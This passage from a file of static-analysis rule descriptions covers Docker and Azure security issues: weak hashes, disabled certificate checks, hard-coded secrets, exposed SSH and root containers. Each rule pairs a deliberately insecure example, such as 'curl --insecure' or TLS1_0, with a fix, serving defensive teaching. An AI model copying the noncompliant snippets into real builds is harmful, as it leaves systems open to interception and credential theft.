\"a40216e7c028e7d77f1aec22d2bbd5f9a357016f  go1.20.linux-amd64.tar.gz\" | sha1sum -c\nRUN tar -C /usr/local -xzf go1.20.linux-amd64.tar.gz\nENV PATH=\"$PATH:/usr/local/go/bin\"\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nFROM ubuntu:22.04\n\nRUN echo \"5a9ebcc65c1cce56e0d2dc616aff4c4cedcfbda8cc6f0288cc08cda3b18dcbf1  go1.20.linux-amd64.tar.gz\" | sha256sum -c\nRUN tar -C /usr/local -xzf go1.20.linux-amd64.tar.gz\nENV PATH=\"$PATH:/usr/local/go/bin\"\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1240\">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "docker:S4830": {
        "name": "Server certificates should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.\nCertificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>\n<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted\nentity and intercept, manipulate, or steal the data being transmitted.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to\nbuild this trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can\nexploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s\nserver, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect\nany data your system sends to them, potentially leading to significant data breaches.</p>\n<h4>Loss of data integrity</h4>\n<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data\nin transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious\ncode or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the\nsystem.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled certificate validation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nFROM ubuntu:22.04\n\n# Noncompliant\nRUN curl --insecure -O https://expired.example.com/downloads/install.sh\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nFROM ubuntu:22.04\n\nRUN curl -O https://new.example.com/downloads/install.sh\n</pre>\n<h3>How does this work?</h3>\n<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>\n<p>To avoid running into problems with invalid certificates, consider the following sections.</p>\n<h4>Using trusted certificates</h4>\n<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list\nof trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no\nadditional code or configuration.</p>\n<h4>Working with self-signed certificates or non-standard CAs</h4>\n<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted\nroots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/295\">CWE-295 - Improper Certificate Validation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "docker:S6437": {
        "name": "Credentials should not be hard-coded",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<p>In Dockerfiles, hard-coded secrets and secrets passed through as variables or created at build-time will cause security risks. The secret\ninformation can be exposed either via the container environment, the image metadata, or the build environment logs.</p>\n<h3>What is the potential impact?</h3>\n<p>The consequences vary greatly depending on the situation and the secret-exposed audience. Still, two main scenarios should be considered.</p>\n<h4>Financial loss</h4>\n<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of\nclient applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own\nneed, including in a way that was not expected.</p>\n<p>This additional use of the secret will lead to added costs with the service provider.</p>\n<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected\napplication. This might result in a partial denial of service for all the application’s users.</p>\n<h4>Application’s security downgrade</h4>\n<p>A downgrade can happen when the disclosed secret is used to protect security-sensitive assets or features of the application. Depending on the\naffected asset or feature, the practical impact can range from a sensitive information leak to a complete takeover of the application, its hosting\nserver or another linked component.</p>\n<p>For example, an application that would disclose a secret used to sign user authentication tokens would be at risk of user identity impersonation.\nAn attacker accessing the leaked secret could sign session tokens for arbitrary users and take over their privileges and entitlements.</p>\n<h2>How to fix it</h2>\n<p>Best practices recommend using a secret vault for all secrets that must be accessed at container runtime. This will ensure the secret’s security\nand prevent any further unexpected disclosure. Depending on the development platform and the leaked secret type, multiple solutions are currently\navailable.</p>\n<p>For all secrets that must be accessed at image build time, it is recommended to rely on Docker Buildkit’s secret mount options. This will prevent\nsecrets from being disclosed in image’s metadata and build logs.</p>\n<p>Additionally, investigations and remediation actions should be conducted to ensure the current and future security of the infrastructure.</p>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p><strong>Analyze recent secret use</strong></p>\n<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will\nallow determining if an attacker took advantage of the leaked secret and to what extent.</p>\n<p>This operation should be part of a global incident response process.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The following code sample generates a new SSH private key that will be stored in the generated image. This key should be considered as compromised.\nMoreover, the SSH key encryption passphrase is also hardcoded.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nFROM example\n\n# Noncompliant\nRUN ssh-keygen -N \"passphrase\" -t rsa -b 2048 -f /etc/ssh/rsa_key\n\nRUN /example.sh --ssh /etc/ssh/rsa_key\n</pre>\n<p>The following code sample uses a seemingly hidden password which is actually leaked in the image metadata after the build.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nFROM example\nARG PASSWORD\n\n# Noncompliant\nRUN wget --user=guest --password=\"$PASSWORD\" https://example.com\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nFROM example\n\nRUN --mount=type=secret,id=ssh,target=/etc/ssh/rsa_key \\\n    /example.sh --ssh /etc/ssh/rsa_key\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nFROM example\n\nRUN --mount=type=secret,id=wget,target=/home/user/.wgetrc \\\n    wget --user=guest https://example.com\n</pre>\n<p>For runtime secrets, best practices recommend relying on a vault service to pass secret information to the containers. Docker environment provides\nSwarm services that implement such a feature.</p>\n<p>If such an option can not be considered, store the runtime secrets in an <a href=\"https://docs.docker.com/compose/env-file/\">environment file</a>\nsuch as <code>.env</code> and then start the container with the <a\nhref=\"https://docs.docker.com/engine/reference/commandline/run/#env\"><code>--env-file</code></a> argument:</p>\n<pre>\ndocker run --env-file .env myImage\n</pre>\n<p>It is then important to ensure that the environment files are securely stored and generated.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> AWS Documentation - <a href=\"https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html\">What is AWS Secrets Manager</a> </li>\n  <li> Azure Documentation - <a href=\"https://learn.microsoft.com/en-us/azure/key-vault/\">Azure Key Vault</a> </li>\n  <li> Google Cloud - <a href=\"https://cloud.google.com/secret-manager/docs\">Secret Manager documentation</a> </li>\n  <li> HashiCorp Developer - <a href=\"https://developer.hashicorp.com/vault/docs\">Vault Documentation</a> </li>\n  <li> Docker Documentation - <a href=\"https://docs.docker.com/engine/swarm/secrets/\">Manage sensitive data with Docker secrets</a> </li>\n  <li> Docker Documentation - <a href=\"https://docs.docker.com/engine/reference/builder/#run---mounttypesecret\">RUN command secrets mount points</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/522\">CWE-522 - Insufficiently Protected Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "docker:S6472": {
        "name": "Using ENV or ARG to handle secrets is security-sensitive",
        "htmlDesc": "<p>Using <code>ENV</code> and <code>ARG</code> to handle secrets can lead to sensitive information being disclosed to an inappropriate sphere.</p>\n<p>The <code>ARG</code> and <code>ENV</code> instructions in a Dockerfile are used to configure the image build and the container environment\nrespectively. Both can be used at image build time, during the execution of commands in the container, and <code>ENV</code> can also be used at\nruntime.</p>\n<p>In most cases, build-time and environment variables are used to propagate configuration items from the host to the image or container. A typical\nexample for an environmental variable is the <code>PATH</code> variable, used to configure where system executables are searched for.</p>\n<p>Using <code>ARG</code> and <code>ENV</code> to propagate configuration entries that contain secrets causes a security risk. Indeed, in most cases,\nartifacts of those values are kept in the final image. The secret information leak can happen either in the container environment itself, the image\nmetadata or the build environment logs.</p>\n<p>The concrete impact of such an issue highly depends on the secret’s purpose and the exposure sphere:</p>\n<ul>\n  <li> Financial impact if a paid service API key is disclosed and used. </li>\n  <li> Application compromise if an application’s secret, like a session signing key, is disclosed. </li>\n  <li> Infrastructure component takeover, if a system secret, like a remote access key, is leaked. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The variable contains a value that should be kept confidential. </li>\n  <li> The container image or Dockerfile will be distributed to users who do not need to know the secret value. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use Buildkit’s secret mount options when secrets have to be used at build time. </li>\n  <li> For run time secret variables, best practices would recommend only setting them at runtime, for example with the <code>--env</code> option of\n  the <code>docker run</code> command. </li>\n</ul>\n<p>Note that, in both cases, the files exposing the secrets should be securely stored and not exposed to a large sphere. In most cases, using a secret\nvault or another similar component should be preferred. For example, <strong>Docker Swarm</strong> provides a <strong>secrets</strong> service that\ncan be used to handle most confidential data.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nFROM example\n# Sensitive\nARG ACCESS_TOKEN\n# Sensitive\nENV ACCESS_TOKEN=${ACCESS_TOKEN}\nCMD /run.sh\n</pre>\n<h2>Compliant Solution</h2>\n<p>For build time secrets, use <a href=\"https://docs.docker.com/engine/reference/builder/#run---mounttypesecret\">Buildkit’s secret mount type</a>\ninstead:</p>\n<pre>\nFROM example\nRUN --mount=type=secret,id=build_secret ./installer.sh\n</pre>\n<p>For runtime secrets, leave the environment variables empty until runtime:</p>\n<pre>\nFROM example\nENV ACCESS_TOKEN=\"\"\nCMD /run.sh\n</pre>\n<p>Store the runtime secrets in an <a href=\"https://docs.docker.com/compose/env-file/\">environment file</a> (such as <code>.env</code>) and then start\nthe container with the <a href=\"https://docs.docker.com/engine/reference/commandline/run/#env\"><code>--env-file</code></a> argument:</p>\n<pre>\ndocker run --env-file .env myImage\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.docker.com/engine/reference/builder/#env\">Dockerfile reference</a> - ENV command </li>\n  <li> <a href=\"https://docs.docker.com/engine/reference/builder/#arg\">Dockerfile reference</a> - ARG command </li>\n  <li> <a href=\"https://docs.docker.com/engine/reference/builder/#run---mounttypesecret\">Dockerfile reference</a> - RUN command secrets mount points\n  </li>\n  <li> <a href=\"https://docs.docker.com/engine/swarm/secrets/\">Docker documentation</a> - Manage sensitive data with Docker secrets </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/522\">CWE-522 - Insufficiently Protected Credentials</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "docker:S6473": {
        "name": "Exposing administration services is security-sensitive",
        "htmlDesc": "<p>Exposing administration services can lead to unauthorized access to containers or escalation of privilege inside of containers.</p>\n<p>A port that is commonly used for administration services is marked as being open through the <code>EXPOSE</code> command. Administration services\nlike SSH might contain vulnerabilities, hard-coded credentials, or other security issues that increase the attack surface of a Docker deployment.<br>\nEven if the ports of the services do not get forwarded to the host system, by default they are reachable from other containers in the same network. A\nmalicious actor that gets access to one container could use such services to escalate access and privileges.</p>\n<p>Removing the <code>EXPOSE</code> command is not sufficient to be secure. The port is still open and the service accessible. To be secure, no\nadministration services should be started. Instead, try to access the required information from the host system. For example, if the administration\nservice is included to access logs or debug a service, you can do this from the host system instead. Docker allows you to read out any file that is\ninside of a container and to spawn a shell inside of a container if necessary.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The container starts an administration service. </li>\n</ul>\n<p>There is a risk if you answered yes to the question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Do not start SSH, VNC, RDP or similar administration services in containers. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nFROM ubuntu:22.04\n# Sensitive\nEXPOSE 22\nCMD [\"/usr/sbin/sshd\", \"-f\", \"/etc/ssh/sshd_config\", \"-D\"]\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> <a href=\"https://docs.docker.com/engine/reference/builder/#expose\">Dockerfile reference</a> - EXPOSE </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "docker:S6431": {
        "name": "Using host operating system namespaces is security-sensitive",
        "htmlDesc": "<p>Using host operating system namespaces can lead to compromise of the host system.<br> Opening network services of the local host system to the\ncontainer creates a new attack surface for attackers.</p>\n<p>Host network sharing could provide a significant performance advantage for workloads that require critical network performance. However, the\nsuccessful exploitation of this attack vector could have a catastrophic impact on confidentiality within the host.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The host exposes sensitive network services. </li>\n  <li> The container’s services performances do <strong>not</strong> rely on operating system namespaces. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not use host operating system namespaces.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n# syntax=docker/dockerfile:1.3\nFROM example\n# Sensitive\nRUN --network=host wget -O /home/sessions http://127.0.0.1:9000/sessions\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n# syntax=docker/dockerfile:1.3\nFROM example\nRUN --network=none wget -O /home/sessions http://127.0.0.1:9000/sessions\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.docker.com/build/buildkit/dockerfile-frontend/\">Dockerfile reference</a> - Custom Dockerfile syntax </li>\n  <li> <a href=\"https://docs.docker.com/engine/reference/builder/#run---network\">Dockerfile reference</a> - RUN --network </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/653\">CWE-653 - Improper Isolation or Compartmentalization</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "docker:S6470": {
        "name": "Recursively copying context directories is security-sensitive",
        "htmlDesc": "<p>When building a Docker image from a Dockerfile, a context directory is used and sent to the Docker daemon before the actual build starts. This\ncontext directory usually contains the Dockerfile itself, along with all the files that will be necessary for the build to succeed. This generally\nincludes:</p>\n<ul>\n  <li> the source code of applications to set up in the container. </li>\n  <li> configuration files for other software components. </li>\n  <li> other necessary packages or components. </li>\n</ul>\n<p>The <code>COPY</code> and <code>ADD</code> directives in the Dockerfiles are then used to actually copy content from the context directory to the\nimage file system.</p>\n<p>When <code>COPY</code> or <code>ADD</code> are used to recursively copy entire top-level directories or multiple items whose names are determined\nat build-time, unexpected files might get copied to the image filesystem. It could affect their confidentiality.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The copied files and directories might contain sensitive data that should be kept confidential. </li>\n  <li> The context directory contains files and directories that have no functional purpose for the final container image. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<p>Keep in mind that the content of the context directory might change depending on the build environment and over time.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Limit the usage of globbing in the <code>COPY</code> and <code>ADD</code> sources definition. </li>\n  <li> Avoid copying the entire context directory to the image filesystem. </li>\n  <li> Prefer providing an explicit list of files and directories that are required for the image to properly run. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>Copying the complete context directory:</p>\n<pre>\nFROM ubuntu:22.04\n# Sensitive\nCOPY . .\nCMD /run.sh\n</pre>\n<p>Copying multiple files and directories whose names are expanded at build time:</p>\n<pre>\nFROM ubuntu:22.04\n# Sensitive\nCOPY ./example* /\nCOPY ./run.sh /\nCMD /run.sh\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nFROM ubuntu:22.04\nCOPY ./example1 /example1\nCOPY ./example2 /example2\nCOPY ./run.sh /\nCMD /run.sh\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.docker.com/engine/reference/builder/#copy\">Dockerfile reference</a> - COPY directive </li>\n  <li> <a href=\"https://docs.docker.com/engine/reference/builder/#add\">Dockerfile reference</a> - ADD directive </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/497\">CWE-497 - Exposure of Sensitive System Information to an Unauthorized Control\n  Sphere</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "docker:S6471": {
        "name": "Running containers as a privileged user is security-sensitive",
        "htmlDesc": "<p>Running containers as a privileged user weakens their runtime security, allowing any user whose code runs on the container to perform\nadministrative actions.<br> In Linux containers, the privileged user is usually named <code>root</code>. In Windows containers, the equivalent is\n<code>ContainerAdministrator</code>.</p>\n<p>A malicious user can run code on a system either thanks to actions that could be deemed legitimate - depending on internal business logic or\noperational management shells - or thanks to malicious actions. For example, with arbitrary code execution after exploiting a service that the\ncontainer hosts.</p>\n<p>Suppose the container is not hardened to prevent using a shell, interpreter, or <a\nhref=\"https://man7.org/linux/man-pages/man7/capabilities.7.html\">Linux capabilities</a>. In this case, the malicious user can read and exfiltrate any\nfile (including Docker volumes), open new network connections, install malicious software, or, worse, break out of the container’s isolation context\nby exploiting other components.</p>\n<p>This means giving the possibility to attackers to steal important infrastructure files, intellectual property, or personal data.</p>\n<p>Depending on the infrastructure’s resilience, attackers may then extend their attack to other services, such as Kubernetes clusters or cloud\nproviders, in order to maximize their reach.</p>\n<h2>Ask Yourself Whether</h2>\n<p>This container:</p>\n<ul>\n  <li> Serves services accessible from the Internet. </li>\n  <li> Does not require a privileged user to run. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>In the Dockerfile:</p>\n<ul>\n  <li> Create a new default user and use it with the <code>USER</code> statement.\n    <ul>\n      <li> Some container maintainers create a specific user to be used without explicitly setting it as default, such as <code>postgresql</code> or\n      <code>zookeeper</code>. It is recommended to use these users instead of root. </li>\n      <li> On Windows containers, the <code>ContainerUser</code> is available for this purpose. </li>\n    </ul>  </li>\n</ul>\n<p>Or, at launch time:</p>\n<ul>\n  <li> Use the <code>user</code> argument when calling Docker or in the docker-compose file. </li>\n  <li> Add fine-grained Linux capabilities to perform specific actions that require root privileges. </li>\n</ul>\n<p>If this image is already explicitly set to launch with a non-privileged user, you can add it to the safe images list rule property of your\nSonarQube instance, without the tag.</p>\n<h2>Sensitive Code Example</h2>\n<p>For any image that does not provide a user by default, regardless of their underlying operating system:</p>\n<pre>\n# Sensitive\nFROM alpine\n\nENTRYPOINT [\"id\"]\n</pre>\n<p>For multi-stage builds, the last stage is non-compliant if it does not contain the <code>USER</code> instruction with a non-root user:</p>\n<pre>\nFROM alpine AS builder\nCOPY Makefile ./src /\nRUN make build\nUSER nonroot\n\n# Sensitive, previous user settings are dropped\nFROM alpine AS runtime\nCOPY --from=builder bin/production /app\nENTRYPOINT [\"/app/production\"]\n</pre>\n<h2>Compliant Solution</h2>\n<p>For Linux-based images and scratch-based images that untar a Linux distribution:</p>\n<pre>\nFROM alpine\n\nRUN addgroup -S nonroot \\\n    &amp;&amp; adduser -S nonroot -G nonroot\n\nUSER nonroot\n\nENTRYPOINT [\"id\"]\n</pre>\n<p>For Windows-based images, you can use <code>ContainerUser</code> or create a new user:</p>\n<pre>\nFROM mcr.microsoft.com/windows/servercore:ltsc2019\n\nRUN net user /add nonroot\n\nUSER nonroot\n</pre>\n<p>For multi-stage builds, the non-root user should be on the last stage:</p>\n<pre>\nFROM alpine as builder\nCOPY Makefile ./src /\nRUN make build\n\nFROM alpine as runtime\nRUN addgroup -S nonroot \\\n    &amp;&amp; adduser -S nonroot -G nonroot\nCOPY --from=builder bin/production /app\nUSER nonroot\nENTRYPOINT [\"/app/production\"]\n</pre>\n<p>For images that use <code>scratch</code> as their base, it is not possible to add non-privileged users by default. To do this, add an additional\nbuild stage to add the group and user, and later copy <code>/etc/passwd</code>.</p>\n<p>Here is an example that uses <code>adduser</code> in the first stage to generate a user and add it to the <code>/etc/passwd</code> file. In the\nnext stage, this user is added by copying that file over from the previous stage:</p>\n<pre>\nFROM alpine:latest as security_provider\nRUN addgroup -S nonroot \\\n    &amp;&amp; adduser -S nonroot -G nonroot\n\nFROM scratch as production\nCOPY --from=security_provider /etc/passwd /etc/passwd\nUSER nonroot\nCOPY production_binary /app\nENTRYPOINT [\"/app/production_binary\"]\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> <a href=\"https://hub.docker.com/r/nginxinc/nginx-unprivileged\">nginxinc/nginx-unprivileged: Example of a non-root container by default</a>\n  </li>\n  <li> <a\n  href=\"https://learn.microsoft.com/en-us/virtualization/windowscontainers/manage-containers/container-security#when-to-use-containeradmin-and-containeruser-user-accounts\">Microsoft docs, When to use ContainerAdmin and ContainerUser user accounts</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "azureresourcemanager:S4423": {
        "name": "Weak SSL/TLS protocols should not be used",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are\nall considered weak by the cryptographic community, and are officially deprecated:</p>\n<ul>\n  <li> SSL versions 1.0, 2.0 and 3.0 </li>\n  <li> TLS versions 1.0 and 1.1 </li>\n</ul>\n<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform\nmathematical attacks on this data after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Databases</h2>\n<h3>Code examples</h3>\n<p>The following code samples are equivalent For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformysql/servers\">Azure\nDatabase for MySQL servers</a>, <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.dbforpostgresql/servers\">Azure Database for\nPostgreSQL servers</a>, and <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformariadb/servers\">Azure Database for MariaDB\nservers</a>.</p>\n<p>For all of these, there is no minimal TLS version enforced by default.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.DBforMySQL/servers\",\n      \"apiVersion\": \"2017-12-01\",\n      \"name\": \"example\",\n      \"properties\": {\n        \"minimalTlsVersion\": \"TLS1_0\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nresource mysqlDbServer 'Microsoft.DBforMySQL/servers@2017-12-01' = {\n  name: 'example'\n  properties: {\n    minimalTlsVersion: 'TLS1_0' // Noncompliant\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.DBforMySQL/servers\",\n      \"apiVersion\": \"2017-12-01\",\n      \"name\": \"example\",\n      \"properties\": {\n        \"minimalTlsVersion\": \"TLS1_2\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nresource mysqlDbServer 'Microsoft.DBforMySQL/servers@2017-12-01' = {\n  name: 'example'\n  properties: {\n    minimalTlsVersion: 'TLS1_2'\n  }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic\ncommunity.</p>\n<p>The best choices at the moment are the following.</p>\n<h4>Use TLS v1.2 or TLS v1.3</h4>\n<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>\n<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not\nyet have TLS v1.3 support.</p>\n<p>The only 